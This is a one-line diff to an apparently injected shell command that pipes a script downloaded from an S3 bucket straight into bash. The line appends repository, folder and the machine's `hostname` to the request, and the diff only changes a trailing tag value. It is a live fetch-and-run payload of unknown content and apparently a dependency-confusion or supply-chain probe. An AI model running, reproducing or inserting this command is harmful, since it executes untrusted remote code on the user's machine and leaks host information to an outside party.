@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/data-api-builder.git\&folder=azure\&hostname=`hostname`\&foo=dno
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/data-api-builder.git\&folder=azure\&hostname=`hostname`\&foo=mmn
